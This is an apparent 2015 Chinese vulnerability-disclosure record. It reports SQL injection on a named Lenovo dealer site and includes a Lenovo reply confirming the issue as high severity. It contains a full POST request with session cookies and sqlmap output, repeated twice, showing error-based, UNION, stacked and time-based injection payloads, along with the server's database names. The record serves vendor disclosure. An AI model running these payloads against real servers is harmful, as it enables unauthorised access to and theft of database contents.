wybug_detail:
漏洞详情 披露状态：   									2015-04-20：	细节已通知厂商并且等待厂商处理中									2015-04-21：	厂商已经确认，细节仅向厂商公开									2015-05-01：	细节向核心白帽子及相关领域专家公开									2015-05-11：	细节向普通白帽子公开									2015-05-21：	细节向实习白帽子公开									2015-06-05：	细节向公众公开  简要描述：  详细说明：  
http://dlx.lenovo.com/dlx3/TSR.Web.OutSide/UI/NewStorefront/addSalePlace.aspx?p=32165&level=-1
页面存在SQL注入：
POST /DLX3/TSR.Web.OutSide/ajax/TSR.Biz.OutSide.AjaxMethod,TSR.Biz.OutSide.ashx?_method=GetProvince&_session=rw HTTP/1.1Host: dlx.lenovo.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://dlx.lenovo.com/dlx3/TSR.Web.OutSide/UI/NewStorefront/addSalePlace.aspx?p=32165&level=-1Content-Length: 24Content-Type: text/plain; charset=UTF-8Cookie: __CSRFCOOKIE=9c5206e8-50c6-4afc-ab75-c7262eee2e93; ASP.NET_SessionId=1esh33ud4zbwjr3fd3seh155Connection: keep-alivePragma: no-cacheCache-Control: no-cacheLocationID=3AreaID=-1
   漏洞证明：  
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: LocationID    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: LocationID=3AreaID=-1' AND 4227=CONVERT(INT,(SELECT CHAR(113)+CHAR(122)+CHAR(112)+CHAR(110)+CHAR(113)+(SELECT (CASE WHEN (4227=4227) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(116)+CHAR(101)+CHAR(112)+CHAR(113))) AND 'IPKp'='IPKp    Type: UNION query    Title: Generic UNION query (NULL) - 2 columns    Payload: LocationID=3AreaID=-1' UNION ALL SELECT CHAR(113)+CHAR(122)+CHAR(112)+CHAR(110)+CHAR(113)+CHAR(120)+CHAR(80)+CHAR(112)+CHAR(87)+CHAR(116)+CHAR(74)+CHAR(108)+CHAR(90)+CHAR(83)+CHAR(103)+CHAR(113)+CHAR(116)+CHAR(101)+CHAR(112)+CHAR(113),NULL--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: LocationID=3AreaID=-1'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: LocationID=3AreaID=-1' WAITFOR DELAY '0:0:5'-----web server operating system: Windows 2008 or Vistaweb application technology: ASP.NET, ASP.NET 2.0.50727, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2005sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: LocationID    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: LocationID=3AreaID=-1' AND 4227=CONVERT(INT,(SELECT CHAR(113)+CHAR(122)+CHAR(112)+CHAR(110)+CHAR(113)+(SELECT (CASE WHEN (4227=4227) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(116)+CHAR(101)+CHAR(112)+CHAR(113))) AND 'IPKp'='IPKp    Type: UNION query    Title: Generic UNION query (NULL) - 2 columns    Payload: LocationID=3AreaID=-1' UNION ALL SELECT CHAR(113)+CHAR(122)+CHAR(112)+CHAR(110)+CHAR(113)+CHAR(120)+CHAR(80)+CHAR(112)+CHAR(87)+CHAR(116)+CHAR(74)+CHAR(108)+CHAR(90)+CHAR(83)+CHAR(103)+CHAR(113)+CHAR(116)+CHAR(101)+CHAR(112)+CHAR(113),NULL--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: LocationID=3AreaID=-1'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: LocationID=3AreaID=-1' WAITFOR DELAY '0:0:5'-----web server operating system: Windows 2008 or Vistaweb application technology: ASP.NET, ASP.NET 2.0.50727, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2005available databases [20]:[*] CSOExam[*] CSOExam_bak[*] customerinfo[*] DBA[*] gislenovo[*] gislenovo_bak[*] Learning7[*] master[*] model[*] msdb[*] sms[*] sms_bak[*] SSF[*] sunny[*] Supervisor[*] symbiosisMeeting[*] tempdb[*] Test2_xfdlx[*] xfdlx[*] xfdlx_bak

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-04-21 14:47 厂商回复： 感谢您对联想信息安全工作的关注与支持！联想于2015年4月3日启用安全应急响应中心（LSRC），欢迎大家向我们反馈联想产品、服务和业务系统的安全漏洞，以帮助我们提升产品和业务的安全性。相关细则请登录安全应急响应中心站点(http:// )1. 4月联想组织双倍积分回馈活动！2. 4月杰出贡献奖，Ipad Air2一台！  最新状态： 暂无
